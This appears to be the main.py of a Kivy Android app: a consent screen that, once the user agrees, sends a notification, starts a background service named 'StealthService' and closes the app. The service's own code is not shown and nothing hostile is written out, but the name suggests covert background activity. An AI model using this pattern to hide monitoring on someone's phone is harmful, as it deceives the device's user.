# main.py
from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from notification import notify_user
from jnius import autoclass

class ConsentScreen(BoxLayout):
    def agree(self):
        notify_user("✅ Agreement made", "Service is running")

        # اجرای سرویس پس‌زمینه
        PythonService = autoclass('org.kivy.android.PythonService')
        service = PythonService.mService
        if not service:
            from android import AndroidService
            AndroidService.start("StealthService", "running ...")

        App.get_running_app().stop()

class ConsentApp(App):
    def build(self):
        return ConsentScreen()

ConsentApp().run()
